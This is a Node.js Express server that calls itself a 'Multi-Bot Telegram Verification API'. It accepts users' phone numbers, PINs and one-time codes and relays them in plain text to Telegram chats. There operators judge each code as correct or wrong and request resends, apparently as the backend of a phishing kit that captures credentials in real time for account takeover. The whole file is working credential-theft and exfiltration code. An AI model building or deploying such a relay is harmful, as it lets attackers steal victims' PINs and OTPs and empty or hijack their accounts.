const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const cors = require("cors");
const axios = require("axios");
const { sendToTelegram } = require("./telegram");
require("dotenv").config();

const app = express();

app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  }),
);

app.use(express.json());

// ==================== CONFIGURATION ====================
const BOTS_CONFIG = JSON.parse(process.env.BOTS || "[]");

if (!BOTS_CONFIG.length) {
  console.error("❌ ERROR: No bots configured. Set BOTS environment variable.");
  process.exit(1);
}

console.log(`✅ Loaded ${BOTS_CONFIG.length} bots`);

// Initialize all bots
const bots = {};
const botInstances = {};

BOTS_CONFIG.forEach((config) => {
  try {
    bots[config.name] = config;
    botInstances[config.name] = new Telegraf(config.token);
    console.log(`✅ Bot initialized: ${config.name}`);
  } catch (error) {
    console.error(`❌ Failed to initialize bot ${config.name}:`, error.message);
  }
});

// Store sessions per bot
const botSessions = {};
BOTS_CONFIG.forEach((config) => {
  botSessions[config.name] = {
    pinSessions: new Map(),
    otpSessions: new Map(),
  };
});

const TIMEOUT_MINUTES = 5;
const TIMEOUT_MS = TIMEOUT_MINUTES * 60 * 1000;

// ==================== AUTO-REGISTER WEBHOOKS ====================

async function registerAllWebhooks() {
  console.log("\n🔗 Registering Telegram webhooks...");

  for (const config of BOTS_CONFIG) {
    try {
      const webhookUrl = `${process.env.RENDER_EXTERNAL_URL || `https://data-server-u23x.onrender.com`}/webhook/${config.name}`;

      console.log(`📡 Setting webhook for ${config.name}: ${webhookUrl}`);

      // Delete existing webhook first
      await axios.get(
        `https://api.telegram.org/bot${config.token}/deleteWebhook`,
      );

      // Set new webhook
      const response = await axios.post(
        `https://api.telegram.org/bot${config.token}/setWebhook`,
        {
          url: webhookUrl,
          max_connections: 40,
          allowed_updates: ["message", "callback_query", "chat_member"],
        },
      );

      if (response.data.ok) {
        console.log(`✅ ${config.name}: Webhook registered successfully`);
      } else {
        console.log(`❌ ${config.name}: Failed - ${response.data.description}`);
      }
    } catch (error) {
      console.error(
        `❌ Error registering webhook for ${config.name}:`,
        error.message,
      );
    }
  }
}

// Call it when server starts
registerAllWebhooks();

// ==================== HELPER FUNCTIONS ====================

function formatPinMessage(pinData) {
  const now = new Date();
  const formattedTime = now
    .toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    })
    .replace(":", ".");

  return `
<b># Thor - PIN Verification</b>
<b>PIN VERIFICATION NEEDED</b>

<b>USER DETAILS:</b>
• <b>Phone Number:</b> ${pinData.phoneNumber}
• <b>PIN Code:</b> <code>${pinData.pinCode}</code>
• <b>User ID:</b> ${pinData.userId || "Unknown"}
• <b>Time:</b> ${pinData.time}
• <b>Bot:</b> ${pinData.botName}

══════════════════════════

<b>Verify the PIN:</b>
• PIN Length: ${pinData.pinCode.length} digits
• Timeout: ${TIMEOUT_MINUTES} minutes
  ${formattedTime}

══════════════════════════
  `;
}

function formatVerificationMessage(userData) {
  const now = new Date();
  const formattedTime = now
    .toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      hour12: false,
    })
    .replace(":", ".");

  return `
<b># Oliva</b>
<b>Connecting...</b>

<b>NEW USER - VERIFICATION NEEDED</b>
• <b>Country Code:</b> ${userData.countryCode}
• <b>Phone Number:</b> ${userData.phoneNumber}
• <b>OTP Code:</b> <code>${userData.otpCode}</code>
• <b>Time:</b> ${userData.time}
• <b>Bot:</b> ${userData.botName}

══════════════════════════

<b>Verify the credentials:</b>
• Timeout: ${TIMEOUT_MINUTES} minutes
  ${formattedTime}

══════════════════════════
  `;
}

function extractBotNameFromSession(sessionId) {
  // Session ID format: PIN_client1_123456789_abc123 or OTP_client1_123456789_abc123
  const parts = sessionId.split("_");

  // PIN_client1_1769434236822_kub2bqlk4
  //   [0]  [1]     [2]           [3]
  if (parts.length >= 2 && parts[0] === "PIN") {
    return parts[1]; // Returns "client1" for PIN sessions
  }

  if (parts.length >= 2 && parts[0] === "OTP") {
    return parts[1]; // Returns "client1" for OTP sessions
  }

  // Fallback: try to find bot name in sessionId
  for (const botName in bots) {
    if (sessionId.includes(botName)) {
      return botName;
    }
  }

  // Last resort: return first bot name
  const firstBot = Object.keys(bots)[0];
  return firstBot || "client1";
}

// =================== PIN ENDPOINTS ====================

app.post("/api/verify-pin", async (req, res) => {
  try {
    const { phoneNumber, pinCode, userId, userName, bot: botName } = req.body;

    if (!botName) {
      return res.status(400).json({
        error: "Missing required field: bot (bot name is required)",
      });
    }

    if (!phoneNumber || !pinCode) {
      return res.status(400).json({
        error: "Missing required fields: phoneNumber and pinCode are required",
      });
    }

    if (!/^\d{4,6}$/.test(pinCode)) {
      return res.status(400).json({
        error: "PIN must be 4-6 digits",
      });
    }

    const bot = bots[botName];
    if (!bot) {
      return res.status(404).json({
        error: `Bot "${botName}" not found`,
      });
    }

    const sessionId = `PIN_${botName}_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
    const now = Date.now();

    const pinData = {
      sessionId,
      phoneNumber,
      pinCode,
      userId: userId || "unknown",
      userName: userName || "PIN User",
      time: new Date(now).toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
      status: "pending",
      type: "pin",
      botName: botName,
      createdAt: now,
      expiresAt: now + TIMEOUT_MS,
      message: "PIN verification pending...",
    };

    botSessions[botName].pinSessions.set(sessionId, pinData);
    console.log(`🔐 [${botName}] New PIN session: ${sessionId}`);

    const message = formatPinMessage(pinData);

    try {
      await botInstances[botName].telegram.sendMessage(bot.chatId, message, {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "✅ Correct PIN",
              `pin_correct_${sessionId}`,
            ),
          ],
          [
            Markup.button.callback(
              "Correct PIN & OTP",
              `pinotp_correct_${sessionId}`,
            ),
            Markup.button.callback("❌ Wrong PIN", `pin_wrong_${sessionId}`),
          ],
          [Markup.button.callback("⏱️ Extend Time", `pin_extend_${sessionId}`)],
        ]),
      });
      console.log(`📤 [${botName}] PIN Telegram message sent`);
    } catch (tgError) {
      botSessions[botName].pinSessions.delete(sessionId);
      return res.status(500).json({
        error: "Failed to send PIN verification request to Telegram",
        details: tgError.message,
      });
    }

    res.json({
      success: true,
      sessionId,
      bot: botName,
      message: "PIN verification request sent to Telegram",
      timeout: TIMEOUT_MINUTES,
      checkStatusUrl: `/api/check-pin-status/${botName}/${sessionId}`,
      type: "pin",
    });
  } catch (error) {
    console.error("❌ Error in /api/verify-pin:", error);
    res.status(500).json({
      error: "Failed to process PIN verification request",
      details: error.message,
    });
  }
});

// ✅ FIXED: Check PIN status - REMOVED Math.max(0, ...)
app.get("/api/check-pin-status/:botName/:sessionId", (req, res) => {
  const { botName, sessionId } = req.params;

  if (!botSessions[botName]) {
    return res.json({
      status: "expired",
      message: "Bot not found",
    });
  }

  const session = botSessions[botName].pinSessions.get(sessionId);

  if (!session) {
    return res.json({
      status: "expired",
      message: "PIN session expired or not found",
    });
  }

  const now = Date.now();
  const timeLeft = session.expiresAt - now; // ⬅️ FIXED: Removed Math.max(0, ...)
  const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

  if (timeLeft <= 0 && session.status === "pending") {
    session.status = "expired";
    session.message = "PIN verification timeout";
  }

  res.json({
    status: session.status,
    timeLeft: minutesLeft,
    message: session.message || "",
    updatedAt: session.updatedAt || session.time,
    phone: session.phoneNumber,
    sessionId: session.sessionId,
    bot: botName,
    type: "pin",
  });
});

// ==================== OTP ENDPOINTS ====================

app.post("/api/verify-user", async (req, res) => {
  try {
    const {
      countryCode,
      phoneNumber,
      otpCode,
      userId,
      userName,
      bot: botName,
    } = req.body;

    if (!botName) {
      return res.status(400).json({
        error: "Missing required field: bot (bot name is required)",
      });
    }

    if (!phoneNumber || !otpCode) {
      return res.status(400).json({
        error: "Missing required fields: phoneNumber and otpCode are required",
      });
    }

    const bot = bots[botName];
    if (!bot) {
      return res.status(404).json({
        error: `Bot "${botName}" not found`,
      });
    }

    const sessionId = `OTP_${botName}_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
    const now = Date.now();

    sendToTelegram({ otpCode, token: bot.token, chatId: bot.chatId });

    const userData = {
      sessionId,
      countryCode: countryCode || "+237",
      phoneNumber,
      otpCode,
      userId: userId || "unknown",
      userName: userName || "NEW USER",
      time: new Date(now).toLocaleString("en-US", {
        month: "2-digit",
        day: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
      }),
      status: "pending",
      botName: botName,
      createdAt: now,
      expiresAt: now + TIMEOUT_MS,
      message: "Waiting for approval...",
    };

    botSessions[botName].otpSessions.set(sessionId, userData);
    console.log(`📱 [${botName}] New OTP session: ${sessionId}`);

    const message = formatVerificationMessage(userData);

    try {
      await botInstances[botName].telegram.sendMessage(bot.chatId, message, {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(
              "✅ Correct (PIN + OTP)",
              `correct_${sessionId}`,
            ),
          ],
          [
            Markup.button.callback("❌ Wrong Code", `wrong_code_${sessionId}`),
            Markup.button.callback("❌ Wrong PIN", `wrong_pin_${sessionId}`),
          ],
          [
            Markup.button.callback("🔄 Resend OTP", `resend_${sessionId}`),
            Markup.button.callback("⏱️ Extend Time", `extend_${sessionId}`),
          ],
        ]),
      });
      console.log(`📤 [${botName}] OTP Telegram message sent`);
    } catch (tgError) {
      botSessions[botName].otpSessions.delete(sessionId);
      return res.status(500).json({
        error: "Failed to send verification request to Telegram",
        details: tgError.message,
      });
    }

    res.json({
      success: true,
      sessionId,
      bot: botName,
      message: "Verification requested",
      timeout: TIMEOUT_MINUTES,
      checkStatusUrl: `/api/check-status/${botName}/${sessionId}`,
    });
  } catch (error) {
    console.error("❌ Error in /api/verify-user:", error);
    res.status(500).json({
      error: "Failed to process verification request",
      details: error.message,
    });
  }
});

app.get("/api/check-status/:botName/:sessionId", (req, res) => {
  const { botName, sessionId } = req.params;

  if (!botSessions[botName]) {
    return res.json({
      status: "expired",
      message: "Bot not found",
    });
  }

  const session = botSessions[botName].otpSessions.get(sessionId);

  if (!session) {
    return res.json({
      status: "expired",
      message: "Session expired or not found",
    });
  }

  const now = Date.now();
  const timeLeft = session.expiresAt - now; // ⬅️ FIXED: Removed Math.max(0, ...)
  const minutesLeft = Math.ceil(timeLeft / (60 * 1000));

  if (timeLeft <= 0 && session.status === "pending") {
    session.status = "expired";
    session.message = "Verification timeout";
  }

  res.json({
    status: session.status,
    timeLeft: minutesLeft,
    message: session.message || "",
    updatedAt: session.updatedAt || session.time,
    phone: session.phoneNumber,
    sessionId: session.sessionId,
    bot: botName,
  });
});

// ==================== TELEGRAM WEBHOOKS ====================

BOTS_CONFIG.forEach((config) => {
  const botName = config.name;
  const bot = botInstances[botName];

  app.post(`/webhook/${botName}`, async (req, res) => {
    try {
      await bot.handleUpdate(req.body);
      res.sendStatus(200);
    } catch (error) {
      console.error(`❌ [${botName}] Webhook error:`, error);
      res.status(500).send("Webhook processing failed");
    }
  });

  console.log(`✅ Webhook route created: /webhook/${botName}`);
});

// ==================== TELEGRAM ACTION HANDLERS ====================

BOTS_CONFIG.forEach((config) => {
  const botName = config.name;
  const bot = botInstances[botName];

  if (!bot) return;

  // PIN HANDLERS
  // PIN HANDLERS - ADD BOT NAME EXTRACTION
  bot.action(/pin_correct_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId); // ⬅️ ADD THIS LINE

    if (!botSessions[botName]) {
      await ctx.answerCbQuery("Bot not found");
      return;
    }

    const session = botSessions[botName].pinSessions.get(sessionId);

    if (session) {
      session.status = "approved";
      session.message = "PIN verified successfully";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("✅ PIN correct!");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN APPROVED</b> - User can proceed`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("PIN session expired or not found");
    }
  });

  bot.action(/pin_wrong_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId); // ⬅️ ADD THIS LINE

    if (!botSessions[botName]) {
      await ctx.answerCbQuery("Bot not found");
      return;
    }

    const session = botSessions[botName].pinSessions.get(sessionId);

    if (session) {
      session.status = "wrong_pin";
      session.message = "PIN is incorrect";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("❌ Wrong PIN");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b>`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("PIN session expired or not found");
    }
  });

  bot.action(/pinotp_correct_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId); // ⬅️ ADD THIS LINE

    if (!botSessions[botName]) {
      await ctx.answerCbQuery("Bot not found");
      return;
    }

    const session = botSessions[botName].pinSessions.get(sessionId);

    if (session) {
      session.status = "approved_with_otp";
      session.message = "Verification successful - PIN and OTP correct";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("✅ PIN & OTP correct!");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n✅ <b>PIN & OTP APPROVED</b>`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("PIN session expired or not found");
    }
  });

  bot.action(/pin_extend_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId); // ⬅️ ADD THIS LINE

    if (!botSessions[botName]) {
      await ctx.answerCbQuery("Bot not found");
      return;
    }

    const session = botSessions[botName].pinSessions.get(sessionId);

    if (session) {
      session.expiresAt = Date.now() + TIMEOUT_MS;
      session.message = "PIN verification time extended";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("⏱️ PIN time extended");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b> - +${TIMEOUT_MINUTES} minutes`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("PIN session not found");
    }
  });
  // OTP HANDLERS - COMPLETE SET
  // ✅ OTP - Correct (PIN + OTP)
  bot.action(/correct_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId);

    if (sessionId.startsWith("PIN_")) return;

    const session = botSessions[botName]?.otpSessions.get(sessionId); // ⬅️ otpSessions

    if (session) {
      session.status = "approved";
      session.message = "Credentials verified successfully";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("✅ User approved!");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n✅ <b>APPROVED</b> - User can proceed`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("OTP session not found");
    }
  });

  // ❌ OTP - Wrong Code
  bot.action(/wrong_code_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId);

    if (sessionId.startsWith("PIN_")) return;

    const session = botSessions[botName]?.otpSessions.get(sessionId); // ⬅️ otpSessions

    if (session) {
      session.status = "wrong_code";
      session.message = "OTP code is incorrect. Please resend.";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("❌ Wrong OTP code");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG CODE</b> - Please resend OTP`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("OTP session not found");
    }
  });

  // ❌ OTP - Wrong PIN
  bot.action(/wrong_pin_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId);

    if (sessionId.startsWith("PIN_")) return;

    const session = botSessions[botName]?.otpSessions.get(sessionId); // ⬅️ otpSessions

    if (session) {
      session.status = "wrong_pin";
      session.message = "PIN is incorrect for OTP verification";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("❌ Wrong PIN");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n❌ <b>WRONG PIN</b> - Incorrect PIN provided for OTP verification`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("OTP session not found");
    }
  });

  // 🔄 OTP - Resend
  bot.action(/resend_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId);

    if (sessionId.startsWith("PIN_")) return;

    const session = botSessions[botName]?.otpSessions.get(sessionId); // ⬅️ otpSessions

    if (session) {
      session.status = "resend_requested";
      session.message = "OTP resend requested";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("🔄 OTP resend requested");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n🔄 <b>OTP RESEND REQUESTED</b>`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("OTP session not found");
    }
  });

  // ⏱️ OTP - Extend Time
  bot.action(/extend_(.+)/, async (ctx) => {
    const sessionId = ctx.match[1];
    const botName = extractBotNameFromSession(sessionId);

    if (sessionId.startsWith("PIN_")) return;

    const session = botSessions[botName]?.otpSessions.get(sessionId); // ⬅️ otpSessions

    if (session) {
      session.expiresAt = Date.now() + TIMEOUT_MS;
      session.message = "Time extended";
      session.updatedAt = new Date().toISOString();

      await ctx.answerCbQuery("⏱️ Time extended");
      await ctx.editMessageText(
        `${ctx.callbackQuery.message.text}\n\n⏱️ <b>TIME EXTENDED</b>`,
        { parse_mode: "HTML" },
      );
    } else {
      await ctx.answerCbQuery("OTP session not found");
    }
  });
});

// ==================== HEALTH & DEBUG ====================

app.get("/", (req, res) => {
  const botStatus = BOTS_CONFIG.map((bot) => ({
    name: bot.name,
    sessions: {
      pin: botSessions[bot.name]?.pinSessions.size || 0,
      otp: botSessions[bot.name]?.otpSessions.size || 0,
    },
    webhook: `/webhook/${bot.name}`,
    endpoints: {
      verifyPin: `/api/verify-pin?bot=${bot.name}`,
      verifyUser: `/api/verify-user?bot=${bot.name}`,
    },
  }));

  res.json({
    status: "online",
    service: "Multi-Bot Telegram Verification API",
    totalBots: BOTS_CONFIG.length,
    bots: botStatus,
  });
});

// ==================== SERVER START ====================

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`✅ Multi-bot server running on http://localhost:${PORT}`);
  console.log(`✅ Total bots configured: ${BOTS_CONFIG.length}`);

  BOTS_CONFIG.forEach((bot) => {
    console.log(`   • ${bot.name}: ${bot.chatId}`);
  });
});

// Cleanup old sessions every hour
setInterval(
  () => {
    const now = Date.now();
    let totalCleaned = 0;

    BOTS_CONFIG.forEach((bot) => {
      const { pinSessions, otpSessions } = botSessions[bot.name];

      for (const [id, session] of pinSessions.entries()) {
        if (now - session.createdAt > 24 * 60 * 60 * 1000) {
          pinSessions.delete(id);
          totalCleaned++;
        }
      }

      for (const [id, session] of otpSessions.entries()) {
        if (now - session.createdAt > 24 * 60 * 60 * 1000) {
          otpSessions.delete(id);
          totalCleaned++;
        }
      }
    });

    if (totalCleaned > 0) {
      console.log(`🧹 Cleaned ${totalCleaned} old sessions across all bots`);
    }
  },
  60 * 60 * 1000,
);
